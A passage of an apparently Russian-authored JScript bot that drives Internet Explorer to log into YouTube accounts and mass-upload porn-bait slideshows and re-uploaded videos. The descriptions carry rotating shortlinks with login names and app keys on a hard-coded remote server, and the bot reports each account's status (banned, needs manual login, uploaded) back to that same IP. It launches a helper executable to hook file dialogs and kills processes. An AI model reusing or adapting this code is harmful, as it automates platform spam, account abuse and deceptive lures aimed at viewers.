"Destiny","Hayden","Julianna","Michelle","Adelyn","Arabella","Summer","Callie","Kaitlyn","Ryleigh","Lila","Daniela","Arya","Alana","Esther","Finley","Gabrielle","Jessica","Charlie","Stephanie","Tessa","Makenzie","Ana","Amaya","Alexandria","Alivia","Nova","Anastasia","Iris","Marley","Fiona","Angela","Giselle","Kate","Alayna","Lola","Lucia","Juliette","Parker","Teagan","Sienna","Georgia","Hope","Cali","Vivienne","Izabella","Kinley","Daleyza","Kylee","Jayla","Katelyn","Juliet","Maggie","Dakota","Delaney","Brynlee","Keira","Camille","Leila","Mckenna","Aniyah","Noelle","Josie","Jennifer","Melissa","Gabriela","Allie","Eloise","Cassidy","Jacqueline","Brynn","Sawyer","Evangeline","Jordan","Paris","Olive","Ayla","Rosalie","Kali","Maci","Gemma","Lilliana","Raegan","Lena","Adelaide","Journey","Adelynn","Alessandra","Kenzie","Miranda","Haley","June","Harley","Charlee","Lucille","Talia","Skyler","Makenna","Phoebe","Jane","Lyric","Angel","Elaina","Adrianna","Ruth","Miriam","Diana","Mariana","Danielle","Jenna","Shelby","Nina","Madeleine","Elliana","Amina","Amiyah","Chelsea","Joanna","Jada","Lexi","Katie","Maddison","Fatima","Vera","Malia","Lilah","Madilyn","Amanda","Daniella","Alexia","Kathryn","Paislee","Selena","Laura","Annie","Nyla","Catalina","Kayleigh","Sloane","Kamila","Lia","Haven","Rowan","Ashlyn","Christina","Amber","Myla","Addilyn","Erin","Alison","Ainsley","Raelyn","Cadence","Kendra","Heidi","Kelsey","Nadia","Alondra","Cheyenne","Kaydence","Mikayla","River","Heaven","Arielle","Lana","Blakely","Sabrina","Kyla","Ada","Gracelyn","Allyson","Felicity","Kira","Briella","Kamryn","Adaline","Alicia","Ember","Aylin","Veronica","Esmeralda","Sage","Leslie","Aspen","Gia","Camilla","Ashlynn","Scarlet","Journee","Daphne","Bianca","Mckinley","Amira","Carmen","Kyleigh","Megan","Skye","Elsie","Kennedi","Averie","Carly","Rylie","Gracelynn","Mallory","Emersyn","Logan","Camryn","Annabella","Dylan","Elle","Kiara","Yaretzi","Ariella","Zara","April","Gwendolyn","Anaya","Baylee","Brinley","Sierra","Annalise","Tatum","Serena","Dahlia","Macy","Miracle","Madelynn","Briana","Freya","Macie","Helen","Bethany","Leia","Harlow","Blake","Jayleen","Angelica","Marilyn","Viviana","Francesca","Juniper","Carolina","Jazmin","Emely","Maliyah","Cataleya","Jillian","Joy","Abby","Malaysia","Nylah","Sarai","Evelynn","Nia","Zuri","Addyson","Aleah","Kaia","Bristol","Lorelei","Jazmine","Maeve","Alejandra","Justice","Julie","Marlee","Phoenix","Jimena","Emmalyn","Nayeli","Aleena","Brittany","Amara","Karina","Giuliana","Thea","Braelynn","Kassidy","Braelyn","Luciana","Aubrie","Janelle","Madisyn","Brylee","Leighton","Ryan","Amari","Eve","Millie","Kelly","Selah","Lacey","Willa","Haylee","Jaylah","Sylvia","Melany","Elisa","Elsa","Hattie","Raven","Holly","Aisha","Itzel","Kyra","Tiffany","Jayda","Michaela","Madilynn","Jamie","Celeste","Lilian","Remi","Priscilla","Jazlyn","Karen","Savanna","Zariah","Lauryn","Alanna","Kara","Karla","Cassandra","Ariah","Evie","Frances","Aileen","Lennon","Charley","Rosemary","Danna","Regina","Kaelyn","Virginia","Hanna","Rebekah","Alani","Edith","Liana","Charleigh","Gloria","Cameron","Colette","Kailey","Carter","Helena","Matilda","Imani","Bridget","Cynthia","Janiyah","Marissa","Johanna","Sasha","Kaliyah","Cecelia","Adelina","Jessa","Hayley","Julissa","Winter","Crystal","Kaylie","Bailee","Charli","Henley","Anya","Maia","Skyla","Liberty","Fernanda","Monica","Braylee","Dallas","Mariam","Marie","Beatrice","Hallie","Maryam","Angelique","Anne","Madalyn","Alayah","Annika","Greta","Lilyana","Kadence","Coraline","Lainey","Mabel","Lillie","Anika","Azalea","Dayana","Jaliyah","Addisyn","Emilee","Mira","Angie","Lilith","Mae","Meredith","Guadalupe","Emelia","Margot","Melina","Aniya","Alena","Myra","Elianna","Caitlyn","Jaelynn","Jaelyn","Demi","Mikaela","Tiana","Blair","Shiloh","Ariyah","Saylor","Caitlin","Lindsey","Oakley","Alia","Everleigh","Ivanna","Miah","Emmy","Jessie","Anahi","Kaylin","Ansley","Annabel","Remington","Kora","Maisie","Nathalie","Emory","Karsyn","Pearl","Irene","Kimber","Rosa","Lylah","Magnolia","Samara","Elliot","Renata","Galilea","Kensley","Kiera","Whitney","Amelie","Siena","Bria","Laney","Perla","Tatiana","Zelda","Jaycee","Kori","Montserrat","Lorelai","Adele","Elyse","Katelynn","Kynlee","Marina","Jayden","Kailyn","Avah","Kenley","Aviana","Armani","Dulce","Alaia","Teresa","Natasha","Milani","Amirah","Breanna","Linda","Tenley","Sutton","Elaine","Elliott","Aliza","Kenna","Meadow","Alyson","Rory","Milana","Erica","Esme","Leona","Joselyn","Madalynn","Alma","Chanel","Myah","Karter","Zahra","Audrina","Ariya","Jemma","Eileen","Kallie","Milan","Emmalynn","Lailah","Sloan","Clarissa","Karlee","Laylah","Amiya","Collins","Ellen","Hadassah","Danica","Jaylene","Averi","Reyna","Saige","Wren","Lexie","Dorothy","Lilianna","Monroe","Aryanna","Elisabeth","Ivory","Liv","Janessa","Jaylynn","Livia","Rayna","Alaya","Malaya","Cara","Erika","Amani","Clare","Addilynn","Roselyn","Corinne","Paola","Jolene","Anabelle","Aliana","Lea","Mara","Lennox","Claudia","Kristina","Jaylee","Kaylynn","Zariyah","Gwen","Kinslee","Avianna","Lisa","Raquel","Jolie","Carolyn","Courtney","Penny","Royal","Alannah","Ciara","Chaya","Kassandra","Milena","Mina","Noa","Leanna","Zoie","Ariadne","Monserrat","Nola","Carlee","Isabela","Jazlynn","Kairi","Laurel","Sky","Rosie","Arely","Aubrielle","Kenia","Noemi","Scarlette","Farrah","Leyla","Amia","Bryanna","Naya","Wynter","Hunter","Katalina","Taliyah","Amaris","Emerie","Martha","Thalia","Christine","Estrella","Brenna","Milania","Salma","Lillianna","Marjorie","Shayla","Zendaya","Aurelia","Brenda","Julieta","Adilynn","Deborah","Keyla","Patricia","Emmeline","Hadlee","Giovanna","Kailee","Desiree","Casey","Karlie","Khaleesi","Lara","Tori","Clementine","Nancy","Simone","Ayleen","Estelle","Celine","Madyson","Zaniyah","Adley","Amalia","Paityn","Kathleen","Sandra","Lizbeth","Maleah","Micah","Aryana","Hailee","Aiyana","Joyce","Ryann","Caylee","Kalani","Marisol","Nathaly","Briar","Holland","Lindsay","Remy","Adrienne","Azariah","Harlee","Dana","Frida","Marianna","Yamileth","Chana","Kaya","Lina","Celia","Analia","Hana","Jayde","Joslyn","Romina","Anabella","Barbara","Bryleigh","Emilie","Nathalia","Ally","Evalyn","Bonnie","Zaria","Carla","Estella","Kailani","Rivka","Rylan","Paulina","Kayden","Giana","Yareli","Kaiya","Sariah","Avalynn","Jasmin","Aya","Jewel","Kristen","Paula","Astrid","Jordynn","Kenya","Ann","Annalee","Kai","Kiley","Marleigh","Julianne","Zion","Emmaline","Nataly","Aminah","Amya","Iliana","Jaida","Paloma","Asia","Louisa","Sarahi","Tara","Andi","Arden","Dalary","Aimee","Alisson","Halle","Aitana","Landry","Alisha","Elin","Maliah","Belen","Briley","Raina","Vienna","Esperanza","Judith","Faye","Susan","Aliya","Aranza","Yasmin","Jaylin","Kyndall","Saniyah","Wendy","Yaritza","Azaria","Kaelynn","Neriah","Zainab","Alissa","Cherish","Dixie","Veda","Nala","Tabitha","Cordelia","Ellison","Meilani","Angeline","Reina","Tegan","Hadleigh","Harmoni","Kimora","Ingrid","Lilia","Luz","Aislinn","America","Ellis","Elora","Heather","Natalee","Miya","Heavenly","Jenny","Aubriella","Emmalee","Kensington","Kiana","Lilyanna","Tinley","Ophelia","Moriah","Sharon","Charlize","Abril","Avalyn","Mariyah","Taya","Ireland","Lyra","Noor","Sariyah","Giavanna","Stevie","Rhea","Zaylee","Denise","Frankie","Janiya","Jocelynn","Libby","Aubrianna","Kaitlynn","Princess","Sidney","Alianna"]};
    shortPathArr = [
        //"http://37.59.246.141/youtube/?act=getadultnew&login=igor123aaa&appkey=R_3d47d627386e4521a5cf60d7424412d8",
        "http://37.59.246.141/youtube/?act=getadultnew&login=trussss&appkey=R_cd095da8cb8187378440fae72f266520",
        "http://37.59.246.141/youtube/?act=getadultnew&login=angelicakozlov&appkey=R_639c47077c7b42cbbb67d4e10b38bfd0",
        "http://37.59.246.141/youtube/?act=getadultnew&login=demiandark&appkey=R_362c2378ffd742d0ab01574de59ba30d",
        "http://37.59.246.141/youtube/?act=getadultnew&login=oscorp&appkey=R_6bfce689d8bc49909b284d563b787929",
        "http://37.59.246.141/youtube/?act=getadultnew&login=pochtomatsuka&appkey=R_5251b09cbadf4bed8c26304d059ff50c"
    ];
    log("uploadPornScenario()");
    langKeywords = "en"; // !!!!!!!!!!!!!!!!!!!!!!!
    langDescr = replaceLang(langKeywords);

    var video_params = {
        photoArrayPath: photo_file,
        firstPicText: (langKeywords =="ru")?"Полное порно видео смотрите\\nпо ссылке в описании":"To Watch full porn video follow\\nthe link below in the description",
        allowDescription: true,
        videoCount: 20,
        keywordsFile: me + "\\keys_p_new.txt",
        keywordsCount: 4000,
        keywordsTitleMode: "porn",
        videoNamePrefix: "",
        shortPath: rotateData("shortPathArr", shortPathArr),
        linkDescription: rotateData("descrTextArr"+langDescr, descrTextArr[langDescr])
    };
    browser.youtube.checkingChannelExistence();
    var chk_state = ajax.generateVideoFromImage(video_params);
    if(chk_state == "again"){

        mouseActions.closeFlash();
        chk_state = ajax.generateVideoFromImage(video_params);
        if(chk_state == "again")
            shell.Run("tskill cmd2", 1, true);
    }
    video_params.shortPath += "&channel=" + global_channel_id;
    var videoIdList = ajax.cloneVideo(video_params);
    ajax.sendReport("GET", "http://37.59.246.141/youtube/index.php/?act=newdescr&phone="+loginData+"&descr="+video_params.videoCount+"x10 porn "+langKeywords+" "+video_params.linkDescription,"","");
    ajax.sendReport("GET", "http://37.59.246.141/youtube/index.php/?act=setstate&state=short_adult&phone="+loginData, "","");
    ajax.sendReport("GET", "http://37.59.246.141/youtube/index.php/?act=newtime&phone="+loginData, "","");
}


function uploadGreyVideosScenario(loginData){
    var chk_state;
    sessionFolder = "porn\\";
    keywordsObject.mixing = false;
    keywordsObject.enableLoop = false;

    descrTextArr = {
        ru: ["Анастасия","Марина","Мирослава","Марьяна","Анна","Светлана","Галина","Анжелика","Мария","Варвара","Людмила","Нелли","Елена","Софья","Валентина","Влада","Дарья","Диана","Нина","Виталина","Алина","Яна","Эмилия","Майя","Ирина","Кира","Камилла","Тамара","Екатерина","Ангелина","Альбина","Мелания","Арина","Маргарита","Лилия","Лиана","Полина","Ева","Любовь","Василина","Ольга","Алёна","Лариса","Зарина","Юлия","Дарина","Эвелина","Алия","Татьяна","Карина","Инна","Владислава","Наталья","Василиса","Агата","Самира","Виктория","Олеся","Амелия","Антонина","Елизавета","Аделина","Амина","Ника","Ксения","Оксана","Эльвира","Мадина","Милана","Таисия","Ярослава","Наташа","Вероника","Надежда","Стефания","Снежана","Алиса","Евгения","Регина","Каролина","Валерия","Элина","Алла","Юлиана","Александра","Злата","Виолетта","Ариана","Ульяна","Есения","Лидия","Эльмира","Кристина","Милена","Амалия","Ясмина","София","Вера","Наталия","Жанна"], en: ["Emma","Olivia","Sophia","Ava","Isabella","Mia","Abigail","Emily","Charlotte","Harper","Madison","Amelia","Elizabeth","Sofia","Evelyn","Avery","Chloe","Ella","Grace","Victoria","Aubrey","Scarlett","Zoey","Addison","Lily","Lillian","Natalie","Hannah","Aria","Layla","Brooklyn","Alexa","Zoe","Penelope","Riley","Leah","Audrey","Savannah","Allison","Samantha","Nora","Skylar","Camila","Anna","Paisley","Ariana","Ellie","Aaliyah","Claire","Violet","Stella","Sadie","Mila","Gabriella","Lucy","Arianna","Kennedy","Sarah","Madelyn","Eleanor","Kaylee","Caroline","Hazel","Hailey","Genesis","Kylie","Autumn","Piper","Maya","Nevaeh","Serenity","Peyton","Mackenzie","Bella","Eva","Taylor","Naomi","Aubree","Aurora","Melanie","Lydia","Brianna","Ruby","Katherine","Ashley","Alexis","Alice","Cora","Julia","Madeline","Faith","Annabelle","Alyssa","Isabelle","Vivian","Gianna","Quinn","Clara","Reagan","Khloe","Alexandra","Hadley","Eliana","Sophie","London","Elena","Kimberly","Bailey","Maria","Luna","Willow","Jasmine","Kinsley","Valentina","Kayla","Delilah","Andrea","Natalia","Lauren","Morgan","Rylee","Sydney","Adalynn","Mary","Ximena","Jade","Liliana","Brielle","Ivy","Trinity","Josephine","Adalyn","Jocelyn","Emery","Adeline","Jordyn","Ariel","Everly","Lilly","Paige","Isla","Lyla","Makayla","Molly","Emilia","Mya","Kendall","Melody","Isabel","Brooke","Mckenzie","Nicole","Payton","Margaret","Mariah","Eden","Athena","Amy","Norah","Londyn","Valeria","Sara","Aliyah","Angelina","Gracie","Rose","Rachel","Juliana","Laila","Brooklynn","Valerie","Alina","Reese","Elise","Eliza","Alaina","Raelynn","Leilani","Catherine","Emerson","Cecilia","Genevieve","Daisy","Harmony","Vanessa","Adriana","Presley","Rebecca","Destiny","Hayden","Julianna","Michelle","Adelyn","Arabella","Summer","Callie","Kaitlyn","Ryleigh","Lila","Daniela","Arya","Alana","Esther","Finley","Gabrielle","Jessica","Charlie","Stephanie","Tessa","Makenzie","Ana","Amaya","Alexandria","Alivia","Nova","Anastasia","Iris","Marley","Fiona","Angela","Giselle","Kate","Alayna","Lola","Lucia","Juliette","Parker","Teagan","Sienna","Georgia","Hope","Cali","Vivienne","Izabella","Kinley","Daleyza","Kylee","Jayla","Katelyn","Juliet","Maggie","Dakota","Delaney","Brynlee","Keira","Camille","Leila","Mckenna","Aniyah","Noelle","Josie","Jennifer","Melissa","Gabriela","Allie","Eloise","Cassidy","Jacqueline","Brynn","Sawyer","Evangeline","Jordan","Paris","Olive","Ayla","Rosalie","Kali","Maci","Gemma","Lilliana","Raegan","Lena","Adelaide","Journey","Adelynn","Alessandra","Kenzie","Miranda","Haley","June","Harley","Charlee","Lucille","Talia","Skyler","Makenna","Phoebe","Jane","Lyric","Angel","Elaina","Adrianna","Ruth","Miriam","Diana","Mariana","Danielle","Jenna","Shelby","Nina","Madeleine","Elliana","Amina","Amiyah","Chelsea","Joanna","Jada","Lexi","Katie","Maddison","Fatima","Vera","Malia","Lilah","Madilyn","Amanda","Daniella","Alexia","Kathryn","Paislee","Selena","Laura","Annie","Nyla","Catalina","Kayleigh","Sloane","Kamila","Lia","Haven","Rowan","Ashlyn","Christina","Amber","Myla","Addilyn","Erin","Alison","Ainsley","Raelyn","Cadence","Kendra","Heidi","Kelsey","Nadia","Alondra","Cheyenne","Kaydence","Mikayla","River","Heaven","Arielle","Lana","Blakely","Sabrina","Kyla","Ada","Gracelyn","Allyson","Felicity","Kira","Briella","Kamryn","Adaline","Alicia","Ember","Aylin","Veronica","Esmeralda","Sage","Leslie","Aspen","Gia","Camilla","Ashlynn","Scarlet","Journee","Daphne","Bianca","Mckinley","Amira","Carmen","Kyleigh","Megan","Skye","Elsie","Kennedi","Averie","Carly","Rylie","Gracelynn","Mallory","Emersyn","Logan","Camryn","Annabella","Dylan","Elle","Kiara","Yaretzi","Ariella","Zara","April","Gwendolyn","Anaya","Baylee","Brinley","Sierra","Annalise","Tatum","Serena","Dahlia","Macy","Miracle","Madelynn","Briana","Freya","Macie","Helen","Bethany","Leia","Harlow","Blake","Jayleen","Angelica","Marilyn","Viviana","Francesca","Juniper","Carolina","Jazmin","Emely","Maliyah","Cataleya","Jillian","Joy","Abby","Malaysia","Nylah","Sarai","Evelynn","Nia","Zuri","Addyson","Aleah","Kaia","Bristol","Lorelei","Jazmine","Maeve","Alejandra","Justice","Julie","Marlee","Phoenix","Jimena","Emmalyn","Nayeli","Aleena","Brittany","Amara","Karina","Giuliana","Thea","Braelynn","Kassidy","Braelyn","Luciana","Aubrie","Janelle","Madisyn","Brylee","Leighton","Ryan","Amari","Eve","Millie","Kelly","Selah","Lacey","Willa","Haylee","Jaylah","Sylvia","Melany","Elisa","Elsa","Hattie","Raven","Holly","Aisha","Itzel","Kyra","Tiffany","Jayda","Michaela","Madilynn","Jamie","Celeste","Lilian","Remi","Priscilla","Jazlyn","Karen","Savanna","Zariah","Lauryn","Alanna","Kara","Karla","Cassandra","Ariah","Evie","Frances","Aileen","Lennon","Charley","Rosemary","Danna","Regina","Kaelyn","Virginia","Hanna","Rebekah","Alani","Edith","Liana","Charleigh","Gloria","Cameron","Colette","Kailey","Carter","Helena","Matilda","Imani","Bridget","Cynthia","Janiyah","Marissa","Johanna","Sasha","Kaliyah","Cecelia","Adelina","Jessa","Hayley","Julissa","Winter","Crystal","Kaylie","Bailee","Charli","Henley","Anya","Maia","Skyla","Liberty","Fernanda","Monica","Braylee","Dallas","Mariam","Marie","Beatrice","Hallie","Maryam","Angelique","Anne","Madalyn","Alayah","Annika","Greta","Lilyana","Kadence","Coraline","Lainey","Mabel","Lillie","Anika","Azalea","Dayana","Jaliyah","Addisyn","Emilee","Mira","Angie","Lilith","Mae","Meredith","Guadalupe","Emelia","Margot","Melina","Aniya","Alena","Myra","Elianna","Caitlyn","Jaelynn","Jaelyn","Demi","Mikaela","Tiana","Blair","Shiloh","Ariyah","Saylor","Caitlin","Lindsey","Oakley","Alia","Everleigh","Ivanna","Miah","Emmy","Jessie","Anahi","Kaylin","Ansley","Annabel","Remington","Kora","Maisie","Nathalie","Emory","Karsyn","Pearl","Irene","Kimber","Rosa","Lylah","Magnolia","Samara","Elliot","Renata","Galilea","Kensley","Kiera","Whitney","Amelie","Siena","Bria","Laney","Perla","Tatiana","Zelda","Jaycee","Kori","Montserrat","Lorelai","Adele","Elyse","Katelynn","Kynlee","Marina","Jayden","Kailyn","Avah","Kenley","Aviana","Armani","Dulce","Alaia","Teresa","Natasha","Milani","Amirah","Breanna","Linda","Tenley","Sutton","Elaine","Elliott","Aliza","Kenna","Meadow","Alyson","Rory","Milana","Erica","Esme","Leona","Joselyn","Madalynn","Alma","Chanel","Myah","Karter","Zahra","Audrina","Ariya","Jemma","Eileen","Kallie","Milan","Emmalynn","Lailah","Sloan","Clarissa","Karlee","Laylah","Amiya","Collins","Ellen","Hadassah","Danica","Jaylene","Averi","Reyna","Saige","Wren","Lexie","Dorothy","Lilianna","Monroe","Aryanna","Elisabeth","Ivory","Liv","Janessa","Jaylynn","Livia","Rayna","Alaya","Malaya","Cara","Erika","Amani","Clare","Addilynn","Roselyn","Corinne","Paola","Jolene","Anabelle","Aliana","Lea","Mara","Lennox","Claudia","Kristina","Jaylee","Kaylynn","Zariyah","Gwen","Kinslee","Avianna","Lisa","Raquel","Jolie","Carolyn","Courtney","Penny","Royal","Alannah","Ciara","Chaya","Kassandra","Milena","Mina","Noa","Leanna","Zoie","Ariadne","Monserrat","Nola","Carlee","Isabela","Jazlynn","Kairi","Laurel","Sky","Rosie","Arely","Aubrielle","Kenia","Noemi","Scarlette","Farrah","Leyla","Amia","Bryanna","Naya","Wynter","Hunter","Katalina","Taliyah","Amaris","Emerie","Martha","Thalia","Christine","Estrella","Brenna","Milania","Salma","Lillianna","Marjorie","Shayla","Zendaya","Aurelia","Brenda","Julieta","Adilynn","Deborah","Keyla","Patricia","Emmeline","Hadlee","Giovanna","Kailee","Desiree","Casey","Karlie","Khaleesi","Lara","Tori","Clementine","Nancy","Simone","Ayleen","Estelle","Celine","Madyson","Zaniyah","Adley","Amalia","Paityn","Kathleen","Sandra","Lizbeth","Maleah","Micah","Aryana","Hailee","Aiyana","Joyce","Ryann","Caylee","Kalani","Marisol","Nathaly","Briar","Holland","Lindsay","Remy","Adrienne","Azariah","Harlee","Dana","Frida","Marianna","Yamileth","Chana","Kaya","Lina","Celia","Analia","Hana","Jayde","Joslyn","Romina","Anabella","Barbara","Bryleigh","Emilie","Nathalia","Ally","Evalyn","Bonnie","Zaria","Carla","Estella","Kailani","Rivka","Rylan","Paulina","Kayden","Giana","Yareli","Kaiya","Sariah","Avalynn","Jasmin","Aya","Jewel","Kristen","Paula","Astrid","Jordynn","Kenya","Ann","Annalee","Kai","Kiley","Marleigh","Julianne","Zion","Emmaline","Nataly","Aminah","Amya","Iliana","Jaida","Paloma","Asia","Louisa","Sarahi","Tara","Andi","Arden","Dalary","Aimee","Alisson","Halle","Aitana","Landry","Alisha","Elin","Maliah","Belen","Briley","Raina","Vienna","Esperanza","Judith","Faye","Susan","Aliya","Aranza","Yasmin","Jaylin","Kyndall","Saniyah","Wendy","Yaritza","Azaria","Kaelynn","Neriah","Zainab","Alissa","Cherish","Dixie","Veda","Nala","Tabitha","Cordelia","Ellison","Meilani","Angeline","Reina","Tegan","Hadleigh","Harmoni","Kimora","Ingrid","Lilia","Luz","Aislinn","America","Ellis","Elora","Heather","Natalee","Miya","Heavenly","Jenny","Aubriella","Emmalee","Kensington","Kiana","Lilyanna","Tinley","Ophelia","Moriah","Sharon","Charlize","Abril","Avalyn","Mariyah","Taya","Ireland","Lyra","Noor","Sariyah","Giavanna","Stevie","Rhea","Zaylee","Denise","Frankie","Janiya","Jocelynn","Libby","Aubrianna","Kaitlynn","Princess","Sidney","Alianna"]};
    shortPathArr = [
        //"http://37.59.246.141/youtube/?act=getadultnew&login=igor123aaa&appkey=R_3d47d627386e4521a5cf60d7424412d8",
        "http://37.59.246.141/youtube/?act=getadultnew&login=trussss&appkey=R_cd095da8cb8187378440fae72f266520",
        "http://37.59.246.141/youtube/?act=getadultnew&login=angelicakozlov&appkey=R_639c47077c7b42cbbb67d4e10b38bfd0",
        "http://37.59.246.141/youtube/?act=getadultnew&login=demiandark&appkey=R_362c2378ffd742d0ab01574de59ba30d",
        "http://37.59.246.141/youtube/?act=getadultnew&login=oscorp&appkey=R_6bfce689d8bc49909b284d563b787929",
        "http://37.59.246.141/youtube/?act=getadultnew&login=pochtomatsuka&appkey=R_5251b09cbadf4bed8c26304d059ff50c"
    ];
    log("uploadPornScenario()");
    langKeywords = "en"; // !!!!!!!!!!!!!!!!!!!!!!!
    langDescr = replaceLang(langKeywords);

    var video_params = {
        photoArrayPath: photo_file,
        firstPicText: (langKeywords =="ru")?"Полное порно видео смотрите\\nпо ссылке в описании":"To Watch full porn video follow\\nthe link below in the description",
        allowDescription: true,
        videoCount: 20,
        keywordsFile: me + "\\keys_p_new.txt",
        keywordsCount: 4000,
        keywordsTitleMode: "porn",
        videoNamePrefix: "",
        shortPath: rotateData("shortPathArr", shortPathArr),
        linkDescription: rotateData("descrTextArr"+langDescr, descrTextArr[langDescr])
    };

    browser.youtube.checkingChannelExistence();
    video_params.shortPath += "&channel=" + global_channel_id;

    var vidIDArr = []
    for(var count=0;count<20;count++){
        var currId = browser.uploadNewVideo(video_params);
        if(!currId){
            count--;
            continue;
        }
        vidIDArr.push(currId);
    }
    browser.addAnnotation(vidIDArr);

    ajax.sendReport("GET", "http://37.59.246.141/youtube/index.php/?act=newdescr&phone="+loginData+"&descr="+video_params.videoCount+"x10 porn "+langKeywords+" "+video_params.linkDescription,"","");
    ajax.sendReport("GET", "http://37.59.246.141/youtube/index.php/?act=setstate&state=short_adult&phone="+loginData, "","");
    ajax.sendReport("GET", "http://37.59.246.141/youtube/index.php/?act=newtime&phone="+loginData, "","");
}
// eachAccount(me + "/session/new_acc.txt", function(login, password) {
// mouseEvents.cyberGhost(country);
var acc = userSession("new_acc");
// var testdata = ajax.getTitlesFromSearch("sex");
// log("keys: " +testdata.keys)
// log("title: " +testdata.title)
// WScript.Quit();
log("acc.login.length: " + acc.login.length)
if(acc.login.length < 3){
    shell.Run("tskill cmd2", 1, true);
}
login_state = browser.youtube.login(acc.login, acc.password);
// login_state = "";

switch(login_state){
    case "bad_acc":
        ajax.sendReport("GET","http://37.59.246.141/youtube/index.php/?act=newdescr&phone="+acc.login+"&descr=ban","");
        break;
    case "bad_acc_login":
        ajax.sendReport("GET","http://37.59.246.141/youtube/index.php/?act=newdescr&phone="+acc.login+"&descr=need_manual_login","");
        break;
    default:
        browser.youtube.checkingChannelExistence();
        ajax.getChannelId(acc.login);
        // mouseActions.closeFlash();
        //uploadPornScenario(acc.login);
        // changeInfoAllScenario(acc.login); //!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
        // WScript.Quit();
        if (WScript.Arguments(0)=="adult")
            uploadPornScenario(acc.login);
        if (WScript.Arguments(0)=="films")
            uploadFilmsScenario(acc.login);
        if (WScript.Arguments(0)=="serial")
            uploadSerialScenario(acc.login);
        if (WScript.Arguments(0)=="nopl")
            uploadPornNOPLScenario(acc.login);
        if (WScript.Arguments(0)=="wt")
            uploadGreyVideosScenario(acc.login);
        break;
}
shell.Run("tskill cmd2", 1, true);

// });
function browserClass() {
    var ieb;
    var vid_number = 0;
    this.getKeysFromSearch = function(){
        var data = [];
        var letterArr = ["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z"];
        var query = letterArr[parseInt(Math.random() * letterArr.length)];
        ieb.Navigate("https://www.youtube.com/results");
        wait("https://www.youtube.com/results");
        mouseActions.clickAndWriteToSearchField(query);

        spans = ieb.document.getElementsByTagName("table")[1].getElementsByTagName("span");

        for(var item=0;item<spans.length;item++){
            data.push(spans[item].innerHTML.replace("<b>", "").replace("</b>",""));
        }
        query = data[parseInt(Math.random() * data.length)];
        log("query: " + query + "<-----------------------------");
        if(query == undefined){
            log("undefined!");
            WScript.Quit()
        }
        return query;
    }
    this.getExistingVideos = function() {
        var videoIdList = [];
        ieb.Navigate("https://www.youtube.com/editor?feature=upload");
        wait("https://www.youtube.com/editor?feature=upload");
        WScript.Sleep(5000);

        var mediaList = getElementsByClassName(ieb.document, "media-list")[0];
        var vids = getElementsByClassName(mediaList, "video-original");
        log("EXISTING VIDEOS: " + vids.length);
        for (var i=0;i<vids.length;i++) {
            var id = vids[i].id.split("video-thumb-")[1];
            log(id);
            videoIdList.push(id);
        }
        return videoIdList;
    }
    this.addAnnotation = function(videoIDarr){
        var nowID;
        for(var i=0;i<videoIDarr.length;i++){
            nowID = videoIDarr[i];
            log("nowID: "+ nowID);
            do{
                ieb.Navigate("https://www.youtube.com/endscreen?v="+nowID);
                wait("https://www.youtube.com/endscreen?v="+nowID);
                try{
                    ieb.document.getElementById("endscreen-editor-add-element").click();
                }catch(qwetivcfd){
                    WScript.Sleep(60000);
                    continue;
                }
                break;
            }while(true)
            WScript.Sleep(5000);
            getElementsByClassName(ieb.document, "annotator-create-button")[0].click();
            WScript.Sleep(5000);
            ieb.document.getElementById("annotator-video-type-fixed").click();
            WScript.Sleep(5000);
            //getElementsByClassName(ieb.document, "yt-video-picker-url")[0].value = "https://www.youtube.com/watch?v=ly4LNsLDSk0";
            ieb.document.getElementsByName("video_url")[1].value = "https://www.youtube.com/watch?v=ly4LNsLDSk0";
            WScript.Sleep(5000);
            ieb.document.getElementsByName("action_create_video")[0].click();
            WScript.Sleep(5000);
            ieb.document.getElementById("endscreen-editor-save").click();
            WScript.Sleep(5000);
            // WScript.Quit();
        }
    }
    this.uploadNewVideo = function(params){
        do{
            var remoteData = ajax.getRemote()
        }while(remoteData.title.length < 5)

        var videoID = remoteData.videoid;
        var title = remoteData.title.substr(0, 90);
        log("title: " + title)
        var description = remoteData.keywords;


        if(!ajax.getVideoURLandSaveFile(videoID)){
            log("Status: FALSE")
            return false;
        }
        // videoData = ajax.genVideoData(params.videoNamePrefix, params.linkDescription, params.allowDescription, params.shortPath, params.keywordsFile, params.keywordsCount, params.keywordsTitleMode);
        var vidID = UploadFile(me+"\\my_video.mp4", title, description);
        return vidID;
    }
    function UploadFile(file, keyword, inform) {
        ieb.Navigate("https://www.youtube.com/upload");
        wait("https://www.youtube.com/uploadFILE");
        log("Закачка файла: " + file);
        lmelogin = "123";
        shell.Run(fso.getFile(me + "\\syss.exe").shortPath+" "+file+"|"+lmelogin, 1);
        // shell.Run("cmd /с "+fso.getFile(me + "\\syss.exe").shortPath+" \""+file+"|"+lmelogin+"\"", 1);
        log("FileDialog hooker started");
        WScript.Sleep(10000);
        try {
            ieb.document.getElementById("start-upload-button-single").click();
            log("FileDialog window opened");
            WScript.Sleep(25000);
            log("FileDialog OK");

            ieb.document.getElementsByName("title")[0].value = keyword;
            ieb.document.getElementsByName("description")[1].innerHTML = inform;
        } catch(stupiderr) {
            runIE();
            return;
        }
        videoid_be = "";
        if(inform != "" || true){ // && mode.indexOf("yt_")!=-1
            try {
                videoid_be = getElementsByClassName(ieb.document, "watch-page-link")[0].getElementsByTagName("a")[0].innerHTML.split("be/")[1];
                WScript.Echo("BE BE BE !!!!!!: " +videoid_be);
                sendData("GET", "http://37.59.246.141/youtube/?act=addviewlist&title="+keyword+"&videoid="+videoid_be, "");
            } catch(eaeabe) {}
        }
        log("Title and description OK");
        // WScript.Sleep(60000); WScript.Sleep(60000); WScript.Sleep(60000);
        while(ieb.document.body.innerHTML.indexOf("Нажмите \"Опубликовать\"")==-1) {
            log("Uploading...");
            WScript.Sleep(2000);
        }
        getElementsByClassName(ieb.document, "save-changes-button")[0].click();
        log("Файл закачан: " + file);
        fso.getFile(file).Delete();
        log("Файл удален с диска: " + file);
        UploadFile.uploaded = UploadFile.uploaded || 0;
        UploadFile.uploaded++;
        log("uploaded: " + UploadFile.uploaded);
        if (UploadFile.uploaded > 20) {
            shell.Run("tskill cmd2", 1, true);
        }
        WScript.Sleep(20000);
        runIE();
        return videoid_be;
    }


    this.browserDebug = function (){
        shell.Run("tskill iexplore", 0, true);
        shell.Run("tskill syss", 0, true);
        WScript.Sleep(8000);
        ieb = new ActiveXObject("InternetExplorer.Application");
        WScript.Sleep(5000);
        if (!fso.fileExists(me + "/local"))
